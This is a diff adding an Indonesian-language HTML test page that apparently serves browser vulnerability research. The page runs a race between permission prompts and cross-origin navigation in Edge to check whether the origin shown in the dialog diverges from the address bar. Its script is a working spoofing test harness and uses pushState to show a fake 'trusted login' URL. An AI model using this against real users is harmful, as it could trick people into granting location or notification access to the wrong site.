@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Permission Prompt Origin Desync — Nav Race</title>
+<style>
+  body { font-family: 'Segoe UI', sans-serif; padding:40px; background:#f0f4ff; max-width:820px; }
+  h3 { margin-top:0; }
+  .warn { background:#fff3cd; border:1px solid #ffe69c; border-radius:6px; padding:10px 14px; font-size:13px; }
+  fieldset { background:#fff; border:1px solid #d0d8e8; border-radius:8px; margin:14px 0; }
+  legend { font-size:13px; font-weight:bold; color:#555; }
+  button { padding:12px 20px; background:#0078d4; color:#fff; border:none;
+           border-radius:6px; font-size:14px; cursor:pointer; margin:4px 6px 4px 0; }
+  select { padding:8px; font-size:14px; }
+  label { font-size:14px; }
+  #log { font-size:13px; background:#fff; padding:14px; border-radius:6px; white-space:pre-wrap; }
+  .check { font-size:13px; background:#eef7ee; border:1px solid #c9e6ca; border-radius:6px; padding:12px 14px; margin-top:14px; }
+  .hit { color:#b00020; font-weight:bold; }
+</style>
+</head>
+<body>
+<h3>T2-A: Permission Prompt Origin Desync via Nav Race</h3>
+<div class="warn">
+<b>Hipotesis:</b> saat dialog permission (geolocation/notifikasi) terbuka, navigasi cross-origin dijalankan.
+Kalau <b>origin di dialog</b>, <b>isi address bar</b>, dan <b>origin JS</b> tidak konsisten satu sama lain =
+bug spoofing (preseden Chrome P1 #488762971 — "permission prompt salah origin saat UI/tab lain aktif").<br>
+<b>Aturan SOUL:</b> cross-origin wajib, ulang 5x, rekam video address bar SEBELUM + SESUDAH navigasi,
+test <b>Edge Stable dulu</b> → bandingkan <b>Edge Canary</b>. Origin sama = bukan bug.
+</div>
+
+<div class="check">
+<b>Persiapan (wajib):</b><br>
+1. Buka <b>Edge InPrivate</b> (Ctrl+Shift+N) supaya keputusan permission selalu "tanya dulu".<br>
+2. Pastikan Edge → <code>edge://settings/content/locations</code> (dan notifications) dalam keadaan <b>Ask (default)</b>.<br>
+3. Kalau pernah klik Allow/Block utk github.io di profile biasa, reset dulu — kalau tidak, dialog tidak akan muncul (test gagal, bukan bug).<br>
+4. Rekam video: zoom address bar, mulai rekam SEBELUM klik tombol.
+</div>
+
+<fieldset>
+  <legend>Kontrol race</legend>
+  <label>Mode:
+    <select id="mode">
+      <option value="prompt-first">A: Prompt DULU → Nav (dialog terbuka saat bar pindah)</option>
+      <option value="nav-first">B: Nav DULU → Prompt (dialog dibuka saat loading belum commit)</option>
+    </select>
+  </label>
+  <label>Jeda nav:
+    <select id="delay">
+      <option value="0">0 ms</option>
+      <option value="80" selected>80 ms</option>
+      <option value="300">300 ms</option>
+      <option value="800">800 ms</option>
+    </select>
+  </label>
+  <label>Target nav (cross-origin dari github.io):
+    <select id="target">
+      <option value="https://httpbin.org/delay/8" selected>slow-commit: httpbin.org/delay/8 (jendela lebar ~8 dtk)</option>
+      <option value="https://httpbingo.org/delay/8">slow-commit cadangan: httpbingo.org/delay/8</option>
+      <option value="https://google.com:9090/#https://google.com:9090">fast-fail: google.com:9090 (port beda = origin beda)</option>
+      <option value="https://example.com/">cepat: example.com</option>
+    </select>
+  </label>
+  <br><br>
+  <label>Permission:
+    <select id="perm">
+      <option value="geo" selected>geolocation</option>
+      <option value="notif">notification</option>
+    </select>
+  </label>
+  <button onclick="runRace()">JALANKAN 1x</button>
+  <button onclick="runLoop()">ULANG 5x otomatis</button>
+</fieldset>
+
+<pre id="log"></pre>
+
+<div class="check">
+<b>Checklist observasi (isi DENGAN video, jangan ngarang):</b><br>
+1. Saat address bar sudah menampilkan <b>TARGET</b> tapi dialog permission masih terbuka:
+   teks origin di dialog = <span class="hit">github.io / target / lainnya ?</span><br>
+2. Urutan: dialog <b>menutup duluan</b> atau bar <b>berubah duluan</b>?<br>
+3. Setelah commit: konten yang tampil = <b>halaman attacker / error page / halaman target</b>?<br>
+4. Klik ALLOW saat desync → cek ulang <code>edge://settings/content/locations</code>:
+   izin tercatat untuk <span class="hit">origin mana</span>?<br>
+5. Mode B: dialog muncul SETELAH nav dijalankan — origin yang ditulis dialog =<br><br>
+<b>HIT (laporkan):</b> dialog menyebut <b>origin target</b> padahal request dari github.io,
+atau izin tercatat di origin yang salah, atau bar+dialog+tampilkan dua origin berbeda secara
+konsisten diulang ≥3 dari 5 percobaan.<br>
+<b>BUKAN BUG:</b> dialog menutup segera saat nav mulai, atau origin di dialog selalu github.io (benar),
+atau gagal karena permission sudah pernah di-decide.
+</div>
+
+<script>
+function log(m){ var el=document.getElementById('log'); el.textContent += m+'\n'; el.scrollTop=el.scrollHeight; }
+function cur(){ return location.href; }
+
+function askPermission(kind){
+  if(kind==='geo'){
+    navigator.geolocation.getCurrentPosition(
+      function(){ log('[geo] OK diterima'); },
+      function(e){ log('[geo] ditolak/error: '+e.code+' — (dialog tetap muncul = ini yang diuji)'); }
+    );
+    log('geolocation.getCurrentPosition() dipanggil');
+  } else {
+    if(typeof Notification==='undefined' || !Notification.requestPermission){
+      log('Notification API tidak tersedia di Edge ini'); return;
+    }
+    Notification.requestPermission().then(function(r){ log('[notif] hasil: '+r); });
+    log('Notification.requestPermission() dipanggil');
+  }
+}
+
+function runRace(){
+  var mode=document.getElementById('mode').value;
+  var delay=parseInt(document.getElementById('delay').value,10);
+  var target=document.getElementById('target').value;
+  var perm=document.getElementById('perm').value;
+
+  log('=== MODE '+mode.toUpperCase()+' | perm='+perm+' | delay='+delay+'ms ===');
+  log('origin sebelum: '+location.origin);
+
+  history.pushState({}, '', '/trusted/login?session=secure');
+  log('pushState → bar sementara: '+cur());
+
+  if(mode==='prompt-first'){
+    askPermission(perm);
+    log('nav dijadwalkan +'+delay+'ms → '+target);
+    setTimeout(function(){ log('NAV EKSEKUSI (cek dialog vs bar SEKARANG)'); location.href=target; }, delay);
+  } else {
+    log('nav dijalankan dulu → '+target);
+    location.href=target;
+    // selama nav belum commit, script asal masih hidup → buka prompt
+    requestAnimationFrame(function(){ requestAnimationFrame(function(){
+      log('NAV pending → prompt dibuka sekarang (cek origin di dialog)'); 
+      askPermission(perm);
+    });});
+    if(delay>0){ setTimeout(function(){ try{ askPermission(perm); }catch(e){} }, delay); }
+  }
+}
+
+var loopN=0;
+function runLoop(){
+  loopN=0;
+  log('>>> LOOP 5x — catat tiap iterasi di tabel observasi');
+  (function step(){
+    if(loopN>=5){ log('>>> LOOP SELESAI. Ulangi utk Canary.'); return; }
+    loopN++;
+    log('--- iterasi '+loopN+'/5 ---');
+    runRace();
+    setTimeout(step, 9000); // beri waktu httpbin delay 8s selesai/timeout sebelum run berikutnya
+  })();
+}
+
+log('Target halaman: '+location.origin+' (harus github.io — nav ke opsi lain = cross-origin)');
+log('Siap. Rekam video dulu, lalu klik JALANKAN.');
+</script>
+</body>
+</html>
